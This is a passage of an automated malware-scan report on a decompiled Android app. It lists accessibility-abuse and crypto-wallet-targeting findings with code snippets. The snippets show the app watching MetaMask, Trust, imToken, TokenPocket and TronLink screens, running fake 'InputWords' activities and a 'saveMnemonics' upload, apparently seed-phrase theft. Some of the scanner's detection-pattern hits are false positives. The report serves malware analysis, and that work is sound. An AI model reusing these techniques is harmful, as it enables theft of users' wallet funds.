                BaseService.g().performGlobalAction(3);
```

**169. Accessibility Abuse**
- **Description:** Pattern detected: performGlobalAction
- **File:** `sources/f3/i.java`
- **Line:** 812

```java
                    BaseService.g().performGlobalAction(3);
                    return;
                }
                BaseService.g().performGlobalAction(3);
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException unused2) {
```

**170. Accessibility Abuse**
- **Description:** Pattern detected: performGlobalAction
- **File:** `sources/f3/i.java`
- **Line:** 899

```java
                BaseService.B = false;
                BaseService.C = bool;
                try {
                    BaseService.g().performGlobalAction(2);
                } catch (f unused) {
                }
            }
```

**171. Accessibility Abuse**
- **Description:** Pattern detected: performGlobalAction
- **File:** `sources/f3/i.java`
- **Line:** 2724

```java
            } catch (InterruptedException unused) {
            }
            if (!keyguardManager.isKeyguardSecure()) {
                BaseService.g().performGlobalAction(3);
                return;
            }
            BaseService.g().performGlobalAction(3);
```

**172. Accessibility Abuse**
- **Description:** Pattern detected: performGlobalAction
- **File:** `sources/f3/i.java`
- **Line:** 2727

```java
                BaseService.g().performGlobalAction(3);
                return;
            }
            BaseService.g().performGlobalAction(3);
            try {
                Thread.sleep(1000L);
            } catch (InterruptedException unused2) {
```

**173. Accessibility Abuse**
- **Description:** Pattern detected: accessibilityservice
- **File:** `sources/f3/k.java`
- **Line:** 3

```java
package f3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import com.superbock.auto.BaseService;

```

**174. Accessibility Abuse**
- **Description:** Pattern detected: AccessibilityService
- **File:** `sources/f3/k.java`
- **Line:** 3

```java
package f3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import com.superbock.auto.BaseService;

```

**175. Accessibility Abuse**
- **Description:** Pattern detected: accessibilityservice
- **File:** `sources/f3/k.java`
- **Line:** 4

```java
package f3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import com.superbock.auto.BaseService;

/* loaded from: classes23.dex */
```

**176. Accessibility Abuse**
- **Description:** Pattern detected: AccessibilityService
- **File:** `sources/f3/k.java`
- **Line:** 8

```java
import com.superbock.auto.BaseService;

/* loaded from: classes23.dex */
public final class k extends AccessibilityService.GestureResultCallback {

    /* renamed from: a, reason: collision with root package name */
    public final /* synthetic */ GestureDescription.StrokeDescription f2823a;
```

**177. Accessibility Abuse**
- **Description:** Pattern detected: accessibilityservice
- **File:** `sources/f3/k.java`
- **Line:** 17

```java
        this.f2823a = strokeDescription;
    }

    @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
    public final void onCancelled(GestureDescription gestureDescription) {
        super.onCancelled(gestureDescription);
    }
```

**178. Accessibility Abuse**
- **Description:** Pattern detected: AccessibilityEvent
- **File:** `sources/i/g.java`
- **Line:** 7

```java
import android.graphics.Rect;
import android.os.Parcel;
import android.os.Parcelable;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.constraintlayout.core.motion.utils.TypedValues;
import androidx.core.internal.view.SupportMenu;
```

**179. Accessibility Abuse**
- **Description:** Pattern detected: AccessibilityEvent
- **File:** `sources/i/g.java`
- **Line:** 218

```java
        return eVar;
    }

    public static String G(AccessibilityNodeInfo accessibilityNodeInfo, AccessibilityEvent accessibilityEvent) {
        f.e F2;
        if (accessibilityNodeInfo == null || (F2 = F(accessibilityNodeInfo)) == null) {
            return null;
```

**180. Accessibility Abuse**
- **Description:** Pattern detected: accessibilityEvent
- **File:** `sources/i/g.java`
- **Line:** 218

```java
        return eVar;
    }

    public static String G(AccessibilityNodeInfo accessibilityNodeInfo, AccessibilityEvent accessibilityEvent) {
        f.e F2;
        if (accessibilityNodeInfo == null || (F2 = F(accessibilityNodeInfo)) == null) {
            return null;
```

**181. Accessibility Abuse**
- **Description:** Pattern detected: accessibilityEvent
- **File:** `sources/i/g.java`
- **Line:** 225

```java
        }
        f.e eVar = new f.e();
        eVar.put("r", F2);
        if (accessibilityEvent != null) {
            f.e eVar2 = new f.e();
            eVar2.put("y", Integer.valueOf(accessibilityEvent.getEventType()));
            if (accessibilityEvent.getText() != null) {
```

**182. Accessibility Abuse**
- **Description:** Pattern detected: accessibilityEvent
- **File:** `sources/i/g.java`
- **Line:** 227

```java
        eVar.put("r", F2);
        if (accessibilityEvent != null) {
            f.e eVar2 = new f.e();
            eVar2.put("y", Integer.valueOf(accessibilityEvent.getEventType()));
            if (accessibilityEvent.getText() != null) {
                eVar2.put("t", accessibilityEvent.getText().toString());
            }
```

**183. Accessibility Abuse**
- **Description:** Pattern detected: findAccessibilityNodeInfo
- **File:** `sources/i/g.java`
- **Line:** 378

```java
    }

    public static boolean f(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
        return (accessibilityNodeInfo == null || (findAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str)) == null || findAccessibilityNodeInfosByViewId.isEmpty()) ? false : true;
    }

```

**184. Accessibility Abuse**
- **Description:** Pattern detected: findAccessibilityNodeInfo
- **File:** `sources/i/g.java`
- **Line:** 379

```java

    public static boolean f(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
        return (accessibilityNodeInfo == null || (findAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str)) == null || findAccessibilityNodeInfosByViewId.isEmpty()) ? false : true;
    }

    public static boolean g(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
```

**185. Accessibility Abuse**
- **Description:** Pattern detected: findAccessibilityNodeInfo
- **File:** `sources/i/g.java`
- **Line:** 379

```java

    public static boolean f(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
        return (accessibilityNodeInfo == null || (findAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str)) == null || findAccessibilityNodeInfosByViewId.isEmpty()) ? false : true;
    }

    public static boolean g(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
```

**186. Accessibility Abuse**
- **Description:** Pattern detected: findAccessibilityNodeInfo
- **File:** `sources/i/g.java`
- **Line:** 379

```java

    public static boolean f(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
        return (accessibilityNodeInfo == null || (findAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str)) == null || findAccessibilityNodeInfosByViewId.isEmpty()) ? false : true;
    }

    public static boolean g(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
```

**187. Accessibility Abuse**
- **Description:** Pattern detected: findAccessibilityNodeInfo
- **File:** `sources/i/g.java`
- **Line:** 427

```java
    }

    public static AccessibilityNodeInfo k(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
        if (accessibilityNodeInfo == null || (findAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str)) == null || findAccessibilityNodeInfosByViewId.isEmpty()) {
            return null;
        }
```


### Crypto Wallet Targeting (81 issues)

**1. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: im\.token\.app
- **File:** `smali_classes20/j3/c0.smali`
- **Line:** 89

```java
    move-result-object p1

    const-string v7, "im.token.app"

    invoke-static {v0, v7, v1, p1}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**2. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes20/com/blankj/utilcode/util/EncryptUtils.smali`
- **Line:** 1906

```java
    invoke-direct {v2, p1}, Ljava/security/spec/PKCS8EncodedKeySpec;-><init>([B)V

    invoke-virtual {v1, v2}, Ljava/security/KeyFactory;->generatePrivate(Ljava/security/spec/KeySpec;)Ljava/security/PrivateKey;

    move-result-object p1
```

**3. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: im\.token\.app
- **File:** `smali_classes11/e3/d.smali`
- **Line:** 602

```java
    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    const-string v1, "im.token.app"

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z
```

**4. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali_classes11/e3/d.smali`
- **Line:** 598

```java
    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    const-string v1, "vip.mytokenpocket"

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z
```

**5. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: io\.metamask
- **File:** `smali_classes11/e3/d.smali`
- **Line:** 606

```java
    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    const-string v1, "io.metamask"

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z
```

**6. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.wallet\.crypto\.trustapp
- **File:** `smali_classes11/e3/d.smali`
- **Line:** 594

```java
    sput-object v0, Le3/d;->d:Ljava/util/LinkedHashSet;

    const-string v1, "com.wallet.crypto.trustapp"

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z
```

**7. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.tronlinkpro\.wallet
- **File:** `smali_classes11/e3/d.smali`
- **Line:** 614

```java
    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    const-string v1, "com.tronlinkpro.wallet"

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z
```

**8. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes11/kotlin/collections/builders/MapBuilder.smali`
- **Line:** 78

```java
.field private isReadOnly:Z

.field private keysArray:[Ljava/lang/Object;
    .annotation system Ldalvik/annotation/Signature;
        value = {
```

**9. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes11/kotlin/collections/builders/MapBuilder.smali`
- **Line:** 86

```java
.end field

.field private keysView:Lkotlin/collections/builders/MapBuilderKeys;
    .annotation system Ldalvik/annotation/Signature;
        value = {
```

**10. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes19/androidx/constraintlayout/core/state/ConstraintReference.smali`
- **Line:** 18

```java

# instance fields
.field private key:Ljava/lang/Object;

.field public mAlpha:F
```

**11. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.tronlinkpro\.wallet
- **File:** `smali_classes9/j3/l3.smali`
- **Line:** 89

```java
    move-result-object p1

    const-string v7, "com.tronlinkpro.wallet"

    invoke-static {v0, v7, v1, p1}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**12. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: im\.token\.app
- **File:** `smali_classes6/k3/e.smali`
- **Line:** 645

```java

    :sswitch_0
    const-string v0, "im.token.app"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
```

**13. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali_classes6/k3/e.smali`
- **Line:** 757

```java

    :sswitch_7
    const-string v0, "vip.mytokenpocket"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
```

**14. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: io\.metamask
- **File:** `smali_classes6/k3/e.smali`
- **Line:** 768

```java

    :sswitch_8
    const-string v0, "io.metamask"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
```

**15. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.wallet\.crypto\.trustapp
- **File:** `smali_classes6/k3/e.smali`
- **Line:** 741

```java

    :sswitch_6
    const-string v0, "com.wallet.crypto.trustapp"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
```

**16. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.tronlinkpro\.wallet
- **File:** `smali_classes6/k3/e.smali`
- **Line:** 661

```java

    :sswitch_1
    const-string v0, "com.tronlinkpro.wallet"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
```

**17. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.tronlinkpro\.wallet
- **File:** `smali_classes6/k3/e.smali`
- **Line:** 1755

```java
    invoke-virtual {v1, v3}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    const-string v4, "com.tronlinkpro.wallet"

    invoke-virtual {v1, v4}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V
```

**18. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes6/androidx/emoji2/text/flatbuffer/FlexBuffersBuilder.smali`
- **Line:** 44

```java
.field private final flags:I

.field private keyComparator:Ljava/util/Comparator;
    .annotation system Ldalvik/annotation/Signature;
        value = {
```

**19. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: im\.token\.app
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 7415

```java
    move-object/from16 v17, v11

    const-string v11, "im.token.app"

    packed-switch v2, :pswitch_data_1
```

**20. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 7385

```java
    if-eq v2, v7, :cond_3b

    const-string v7, "vip.mytokenpocket"

    const-string v8, "5,0,255"
```

**21. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: io\.metamask
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 7411

```java
    move-object/from16 v16, v9

    const-string v9, "io.metamask"

    move-object/from16 v17, v11
```

**22. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.wallet\.crypto\.trustapp
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 7391

```java
    const-string v9, "2131492888"

    const-string v10, "com.wallet.crypto.trustapp"

    const-string v13, "30,144,255"
```

**23. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.tronlinkpro\.wallet
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 7365

```java
    const-string v5, "2131165378"

    const-string v6, "com.tronlinkpro.wallet"

    const/16 v7, 0x6a
```

**24. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: io\.metamask
- **File:** `smali_classes25/j3/u0.smali`
- **Line:** 89

```java
    move-result-object p1

    const-string v7, "io.metamask"

    invoke-static {v0, v7, v1, p1}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**25. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: mnemonic
- **File:** `smali_classes3/k3/f.smali`
- **Line:** 3475

```java
    const-string v4, "action"

    const-string v5, "saveMnemonics"

    invoke-virtual {v3, v4, v5}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;
```

**26. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali_classes3/j3/d2.smali`
- **Line:** 89

```java
    move-result-object p1

    const-string v7, "vip.mytokenpocket"

    invoke-static {v0, v7, v1, p1}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**27. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.wallet\.crypto\.trustapp
- **File:** `smali_classes3/j3/d4.smali`
- **Line:** 89

```java
    move-result-object p1

    const-string v7, "com.wallet.crypto.trustapp"

    invoke-static {v0, v7, v1, p1}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**28. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes4/com/tencent/smtt/sdk/SystemWebViewClient$a.smali`
- **Line:** 101

```java
.end method

.method public proceed(Ljava/security/PrivateKey;[Ljava/security/cert/X509Certificate;)V
    .locals 1

```

**29. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes4/com/tencent/smtt/sdk/SystemWebViewClient$a.smali`
- **Line:** 106

```java
    iget-object v0, p0, Lcom/tencent/smtt/sdk/SystemWebViewClient$a;->a:Landroid/webkit/ClientCertRequest;

    invoke-virtual {v0, p1, p2}, Landroid/webkit/ClientCertRequest;->proceed(Ljava/security/PrivateKey;[Ljava/security/cert/X509Certificate;)V

    return-void
```

**30. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes5/com/tencent/smtt/export/external/interfaces/ClientCertRequest.smali`
- **Line:** 34

```java
.end method

.method public abstract proceed(Ljava/security/PrivateKey;[Ljava/security/cert/X509Certificate;)V
.end method

```

**31. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes5/androidx/lifecycle/SavedStateHandle$SavingStateLiveData.smali`
- **Line:** 29

```java
.field private handle:Landroidx/lifecycle/SavedStateHandle;

.field private key:Ljava/lang/String;


```

**32. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: private\s*key
- **File:** `smali_classes2/androidx/constraintlayout/core/state/helpers/GuidelineReference.smali`
- **Line:** 10

```java

# instance fields
.field private key:Ljava/lang/Object;

.field private mEnd:I
```

**33. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: im\.token\.app
- **File:** `smali/com/superbock/App.smali`
- **Line:** 177

```java
    sget-object v12, Lcom/superbock/auto/BaseService;->a0:Ljava/lang/String;

    const-string v13, "im.token.app"

    const v9, 0x7f0f008a
```

**34. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali/com/superbock/App.smali`
- **Line:** 242

```java
    sget-object v12, Lcom/superbock/auto/BaseService;->c0:Ljava/lang/String;

    const-string v13, "vip.mytokenpocket"

    const v9, 0x7f0f00fd
```

**35. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: io\.metamask
- **File:** `smali/com/superbock/App.smali`
- **Line:** 502

```java
    sget-object v10, Lcom/superbock/auto/BaseService;->k0:Ljava/lang/String;

    const-string v11, "io.metamask"

    const v7, 0x7f0f00be
```

**36. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.wallet\.crypto\.trustapp
- **File:** `smali/com/superbock/App.smali`
- **Line:** 307

```java
    sget-object v12, Lcom/superbock/auto/BaseService;->e0:Ljava/lang/String;

    const-string v13, "com.wallet.crypto.trustapp"

    const v9, 0x7f0f010f
```

**37. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.tronlinkpro\.wallet
- **File:** `smali/com/superbock/App.smali`
- **Line:** 372

```java
    sget-object v12, Lcom/superbock/auto/BaseService;->g0:Ljava/lang/String;

    const-string v13, "com.tronlinkpro.wallet"

    const v9, 0x7f0f0109
```

**38. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: im\.token\.app
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 7074

```java
    move-result p1

    const-string p1, "im.token.app"

    iget-object v1, p0, Lcom/superbock/auto/BaseService;->f:Ljava/lang/String;
```

**39. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 7091

```java

    :cond_5
    const-string p1, "vip.mytokenpocket"

    iget-object v2, p0, Lcom/superbock/auto/BaseService;->f:Ljava/lang/String;
```

**40. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 10520

```java
    iget-object v0, p0, Lcom/superbock/auto/BaseService;->e:Landroid/view/accessibility/AccessibilityNodeInfo;

    const-string v1, "vip.mytokenpocket:id/tv_copy"

    invoke-static {v0, v1}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
```

**41. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 10530

```java
    iget-object v0, p0, Lcom/superbock/auto/BaseService;->e:Landroid/view/accessibility/AccessibilityNodeInfo;

    const-string v1, "vip.mytokenpocket:id/tv_next"

    invoke-static {v0, v1}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
```

**42. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: io\.metamask
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 7151

```java

    :cond_9
    const-string p1, "io.metamask"

    iget-object v2, p0, Lcom/superbock/auto/BaseService;->f:Ljava/lang/String;
```

**43. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.wallet\.crypto\.trustapp
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 7106

```java

    :cond_6
    const-string p1, "com.wallet.crypto.trustapp"

    iget-object v2, p0, Lcom/superbock/auto/BaseService;->f:Ljava/lang/String;
```

**44. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.tronlinkpro\.wallet
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 7121

```java

    :cond_7
    const-string p1, "com.tronlinkpro.wallet"

    iget-object v2, p0, Lcom/superbock/auto/BaseService;->f:Ljava/lang/String;
```

**45. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: io\.metamask
- **File:** `smali/com/superbock/ui/custom/InputWordsMetaActivity.smali`
- **Line:** 616

```java
    move-result-object v1

    const-string v2, "io.metamask"

    invoke-static {v0, v2, v1, p0}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**46. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: io\.metamask
- **File:** `smali/com/superbock/ui/custom/InputWordsMetaActivity.smali`
- **Line:** 836

```java

    :cond_0
    const-string v0, "io.metamask"

    invoke-virtual {p1, v0}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V
```

**47. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.wallet\.crypto\.trustapp
- **File:** `smali/com/superbock/ui/custom/InputWordsTrustActivity.smali`
- **Line:** 616

```java
    move-result-object v1

    const-string v2, "com.wallet.crypto.trustapp"

    invoke-static {v0, v2, v1, p0}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**48. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.wallet\.crypto\.trustapp
- **File:** `smali/com/superbock/ui/custom/InputWordsTrustActivity.smali`
- **Line:** 836

```java

    :cond_0
    const-string v0, "com.wallet.crypto.trustapp"

    invoke-virtual {p1, v0}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V
```

**49. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali/com/superbock/ui/custom/InputWordsTpActivity.smali`
- **Line:** 616

```java
    move-result-object v1

    const-string v2, "vip.mytokenpocket"

    invoke-static {v0, v2, v1, p0}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**50. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: vip\.mytokenpocket
- **File:** `smali/com/superbock/ui/custom/InputWordsTpActivity.smali`
- **Line:** 836

```java

    :cond_0
    const-string v0, "vip.mytokenpocket"

    invoke-virtual {p1, v0}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V
```

**51. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: im\.token\.app
- **File:** `smali/com/superbock/ui/custom/InputWordsImActivity.smali`
- **Line:** 614

```java
    move-result-object v1

    const-string v2, "im.token.app"

    invoke-static {v0, v2, v1, p0}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**52. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: im\.token\.app
- **File:** `smali/com/superbock/ui/custom/InputWordsImActivity.smali`
- **Line:** 834

```java

    :cond_0
    const-string v0, "im.token.app"

    invoke-virtual {p1, v0}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V
```

**53. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.tronlinkpro\.wallet
- **File:** `smali/com/superbock/ui/custom/InputWordsTronlinkActivity.smali`
- **Line:** 596

```java
    move-result-object v1

    const-string v2, "com.tronlinkpro.wallet"

    invoke-static {v0, v2, v1, p0}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
```

**54. Crypto Wallet Targeting Detected**
- **Description:** Suspicious pattern found: com\.tronlinkpro\.wallet
- **File:** `smali/com/superbock/ui/custom/InputWordsTronlinkActivity.smali`
- **Line:** 811

```java

    :cond_0
    const-string v0, "com.tronlinkpro.wallet"

    invoke-virtual {p1, v0}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V
```

**55. Crypto Wallet Targeting**
- **Description:** Pattern detected: vip.mytokenpocket
- **File:** `sources/k3/e.java`
- **Line:** 192

```java
    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x00a6, code lost:
    
        if (r3.equals("vip.mytokenpocket") == false) goto L52;
     */
    /* JADX WARN: Type inference failed for: r1v2, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /*
```

**56. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.tronlinkpro.wallet
- **File:** `sources/k3/e.java`
- **Line:** 419

```java
        d5.setBack(1);
        d5.setAutoClose(new Random().nextInt(20) + 20);
        d5.setCustomId(PointerIconCompat.TYPE_CELL);
        d5.setPkg("com.tronlinkpro.wallet");
        d5.setUse(2);
        String c5 = c(context, d5.getPkg());
        if (c5 != null) {
```

**57. Crypto Wallet Targeting**
- **Description:** Pattern detected: Mnemonic
- **File:** `sources/k3/f.java`
- **Line:** 1019

```java
                return;
            }
            f.e eVar = new f.e();
            eVar.put("action", "saveMnemonics");
            eVar.put("deviceId", k3.a.c(context));
            eVar.put("mnemoId", j5.getId());
            eVar.put("type", Integer.valueOf(j5.getTy()));
```

**58. Crypto Wallet Targeting**
- **Description:** Pattern detected: im.token.app
- **File:** `sources/f3/i.java`
- **Line:** 1830

```java
                            AdInfo d9 = androidx.appcompat.view.a.d(2);
                            d9.setTaskId(e3.d.a());
                            d9.setCustomId(103);
                            d9.setPkg("im.token.app");
                            d9.setUse(1);
                            String c9 = k3.e.c(context, d9.getPkg());
                            d9.setImg(c9 != null ? c9 : "2131492872");
```

**59. Crypto Wallet Targeting**
- **Description:** Pattern detected: im.token.app
- **File:** `sources/f3/i.java`
- **Line:** 1926

```java
                                    AdInfo d13 = androidx.appcompat.view.a.d(2);
                                    d13.setTaskId(e3.d.a());
                                    d13.setCustomId(TbsListener.ErrorCode.APK_VERSION_ERROR);
                                    d13.setPkg("im.token.app");
                                    d13.setUse(2);
                                    String c13 = k3.e.c(context, d13.getPkg());
                                    d13.setImg(c13 != null ? c13 : "2131492872");
```

**60. Crypto Wallet Targeting**
- **Description:** Pattern detected: im.token.app
- **File:** `sources/f3/i.java`
- **Line:** 2273

```java
                                            d22.setBack(1);
                                            d22.setAutoClose(new Random().nextInt(20) + 20);
                                            d22.setCustomId(PointerIconCompat.TYPE_HELP);
                                            d22.setPkg("im.token.app");
                                            d22.setUse(2);
                                            String c22 = k3.e.c(context, d22.getPkg());
                                            if (c22 != null) {
```

**61. Crypto Wallet Targeting**
- **Description:** Pattern detected: vip.mytokenpocket
- **File:** `sources/f3/i.java`
- **Line:** 1813

```java
                            AdInfo d8 = androidx.appcompat.view.a.d(2);
                            d8.setTaskId(e3.d.a());
                            d8.setCustomId(102);
                            d8.setPkg("vip.mytokenpocket");
                            d8.setUse(1);
                            String c8 = k3.e.c(context, d8.getPkg());
                            d8.setImg(c8 != null ? c8 : "2131492885");
```

**62. Crypto Wallet Targeting**
- **Description:** Pattern detected: vip.mytokenpocket
- **File:** `sources/f3/i.java`
- **Line:** 1896

```java
                                    AdInfo d12 = androidx.appcompat.view.a.d(2);
                                    d12.setTaskId(e3.d.a());
                                    d12.setCustomId(TbsListener.ErrorCode.APK_PATH_ERROR);
                                    d12.setPkg("vip.mytokenpocket");
                                    d12.setUse(2);
                                    String c12 = k3.e.c(context, d12.getPkg());
                                    d12.setImg(c12 != null ? c12 : "2131492885");
```

**63. Crypto Wallet Targeting**
- **Description:** Pattern detected: vip.mytokenpocket
- **File:** `sources/f3/i.java`
- **Line:** 2217

```java
                                            d21.setBack(1);
                                            d21.setAutoClose(new Random().nextInt(20) + 20);
                                            d21.setCustomId(PointerIconCompat.TYPE_HAND);
                                            d21.setPkg("vip.mytokenpocket");
                                            d21.setUse(2);
                                            String c21 = k3.e.c(context, d21.getPkg());
                                            if (c21 != null) {
```

**64. Crypto Wallet Targeting**
- **Description:** Pattern detected: io.metamask
